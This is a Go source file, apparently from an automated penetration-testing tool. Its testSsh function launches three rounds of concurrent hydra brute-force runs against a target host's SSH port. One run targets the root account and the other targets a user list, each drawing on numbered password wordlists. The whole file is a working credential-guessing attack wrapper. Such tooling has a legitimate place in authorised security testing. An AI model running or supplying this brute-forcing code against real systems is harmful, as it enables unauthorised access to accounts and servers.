package main

import (
	"fmt"
	"sync"

	str "strings"
)

func (t *targetT) testSsh(port int, portInfo portInfoT) {
	print("testing %s on port %d...\n", portInfo.service, port)

	sshWg := &sync.WaitGroup{}

	sshWg.Add(2)
	go t.sshBruteRoot("1", port, sshWg)
	go t.sshBruteUser("1", port, sshWg)
	sshWg.Wait()

	sshWg.Add(2)
	go t.sshBruteRoot("2", port, sshWg)
	go t.sshBruteUser("2", port, sshWg)
	sshWg.Wait()

	sshWg.Add(2)
	go t.sshBruteRoot("3", port, sshWg)
	go t.sshBruteUser("3", port, sshWg)
	sshWg.Wait()

	t.wg.Done()
}

func (t *targetT) sshBruteRoot(scan string, port int, wg *sync.WaitGroup) {
	var c cmdT
	c.name = "ssh_root_" + scan
	c.bin = "hydra"

	argsS := fmt.Sprintf("-l root -P %s -I -u ssh://%s:%d -t 4",
		"./data/ssh_root_pass_"+scan, t.host, port)

	c.args = str.Split(argsS, " ")

	runCmd(t.host, &c)
	wg.Done()
}

func (t *targetT) sshBruteUser(scan string, port int, wg *sync.WaitGroup) {
	var c cmdT
	c.name = "ssh_user_" + scan
	c.bin = "hydra"

	argsS := fmt.Sprintf("-L %s -P %s -I -u ssh://%s:%d -t 2",
		"./data/ssh_user", "./data/ssh_user_pass_"+scan, t.host, port)

	c.args = str.Split(argsS, " ")

	runCmd(t.host, &c)
	wg.Done()
}
